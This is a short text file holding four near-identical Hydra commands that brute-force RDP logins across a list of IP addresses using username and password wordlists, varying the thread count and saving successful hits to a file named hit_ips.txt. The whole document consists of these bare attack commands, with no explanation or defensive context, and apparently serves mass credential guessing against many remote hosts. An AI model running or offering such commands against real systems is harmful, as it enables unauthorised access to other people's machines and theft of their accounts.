hydra -t 25 -L user.txt -P pass.txt -M ip.txt -o hit_ips.txt rdp

hydra -t 15 -L user.txt -P pass.txt -M ip.txt -o hit_ips.txt rdp

hydra -L user.txt -P pass.txt -M ip.txt -o hit_ips.txt rdp

hydra -L user.txt -P pass.txt -M ip.txt -o hit_ips.txt -t 15 rdp
